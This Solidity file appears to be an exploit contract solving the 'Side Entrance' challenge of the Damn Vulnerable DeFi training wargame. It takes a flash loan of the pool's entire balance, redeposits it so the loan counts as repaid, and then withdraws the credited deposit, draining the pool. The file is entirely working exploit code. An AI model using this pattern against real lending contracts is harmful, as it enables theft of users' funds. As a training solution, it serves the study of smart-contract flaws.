// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface SideEntranceLenderPoolX {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

/**
 * @title IFlashLoanEtherReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract IFlashLoanEtherReceiverX {
    address immutable flashloanProvider_;

    constructor(address flashloanProvider) payable {
        flashloanProvider_ = flashloanProvider;
    }

    function startHack() external {
        SideEntranceLenderPoolX(flashloanProvider_).flashLoan(
            address(flashloanProvider_).balance
        );
    }

    function execute() external payable {
        SideEntranceLenderPoolX(flashloanProvider_).deposit{value: msg.value}();
    }

    function endHack() external {
        SideEntranceLenderPoolX(flashloanProvider_).withdraw();
    }

    function withdraw() external {
        payable(msg.sender).call{value: address(this).balance}("");
    }

    receive() external payable {}
}
